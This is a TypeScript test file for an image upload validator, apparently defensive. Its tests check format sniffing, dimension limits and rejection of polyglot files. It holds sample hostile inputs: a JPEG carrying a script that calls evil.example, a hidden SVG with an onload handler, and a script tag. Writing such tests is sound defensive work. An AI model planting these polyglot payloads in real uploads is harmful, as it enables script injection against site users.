import { strToU8 } from 'fflate';
import { describe, expect, it } from 'vitest';
import { testPng } from '#lib/features/export/testing.ts';
import { checkImageBytes, containsMarkup, readImageInfo, sniffImage } from './sniff.ts';
import { minimalJpeg, minimalWebp, svgImage } from './testImages.ts';

describe('sniffImage', () => {
	it('recognises JPEG, PNG and WebP by their magic bytes', () => {
		expect(sniffImage(minimalJpeg())).toBe('jpeg');
		expect(sniffImage(testPng())).toBe('png');
		expect(sniffImage(minimalWebp())).toBe('webp');
	});

	it('refuses SVG, HTML, GIF, BMP and text, whatever their name says', () => {
		expect(sniffImage(svgImage())).toBeNull();
		expect(sniffImage(strToU8('<!doctype html><html><body>hi</body></html>'))).toBeNull();
		expect(sniffImage(strToU8('GIF89a-and-some-more-bytes'))).toBeNull();
		expect(sniffImage(strToU8('BM-and-some-more-bytes-here'))).toBeNull();
		expect(sniffImage(new Uint8Array(0))).toBeNull();
		expect(sniffImage(new Uint8Array([0xff, 0xd8]))).toBeNull();
	});

	it('does not accept a RIFF container that is not WebP', () => {
		const wave = strToU8('RIFF....WAVEfmt more bytes');
		expect(sniffImage(wave)).toBeNull();
	});
});

describe('readImageInfo', () => {
	it('reads the dimensions of each format', () => {
		expect(readImageInfo(minimalJpeg(120, 80))).toEqual({ kind: 'jpeg', w: 120, h: 80 });
		expect(readImageInfo(testPng(80, 60))).toEqual({ kind: 'png', w: 80, h: 60 });
		expect(readImageInfo(minimalWebp(300, 200))).toEqual({ kind: 'webp', w: 300, h: 200 });
	});

	it('gives up on truncated headers', () => {
		expect(readImageInfo(minimalJpeg().slice(0, 12))).toBeNull();
		expect(readImageInfo(testPng().slice(0, 14))).toBeNull();
	});
});

describe('checkImageBytes', () => {
	it('accepts plain images', () => {
		expect(checkImageBytes(testPng()).ok).toBe(true);
		expect(checkImageBytes(minimalJpeg()).ok).toBe(true);
	});

	it('rejects SVG', () => {
		expect(checkImageBytes(svgImage())).toEqual({ ok: false, reason: 'format' });
	});

	it('rejects a JPEG that carries a script', () => {
		const polyglot = minimalJpeg(64, 48, '<script>fetch("https://evil.example")</script>');
		expect(sniffImage(polyglot)).toBe('jpeg');
		expect(checkImageBytes(polyglot)).toEqual({ ok: false, reason: 'markup' });
	});

	it('rejects a JPEG that hides an SVG document', () => {
		const polyglot = minimalJpeg(64, 48, '<svg xmlns="http://www.w3.org/2000/svg" onload="x()"/>');
		expect(checkImageBytes(polyglot)).toEqual({ ok: false, reason: 'markup' });
	});

	it('rejects an SVG that starts like a PNG only after the markup', () => {
		const bytes = new Uint8Array([...svgImage(), ...testPng()]);
		expect(checkImageBytes(bytes)).toEqual({ ok: false, reason: 'format' });
	});

	it('rejects images with absurd dimensions', () => {
		expect(checkImageBytes(minimalJpeg(30_000, 100))).toEqual({ ok: false, reason: 'size' });
		expect(checkImageBytes(minimalWebp(9000, 9000))).toEqual({ ok: false, reason: 'size' });
	});
});

describe('containsMarkup', () => {
	it('finds markup anywhere in the bytes, ignoring case', () => {
		expect(containsMarkup(strToU8('xxxxxxxxxxxxx<SCRIPT src=x>'))).toBe(true);
		expect(containsMarkup(strToU8('xxxxxxxxxxxxx<?xml version="1.0"?>'))).toBe(true);
	});

	it('leaves harmless bytes alone', () => {
		expect(containsMarkup(testPng())).toBe(false);
		expect(containsMarkup(strToU8('a < b and c > d, <3'))).toBe(false);
	});
});
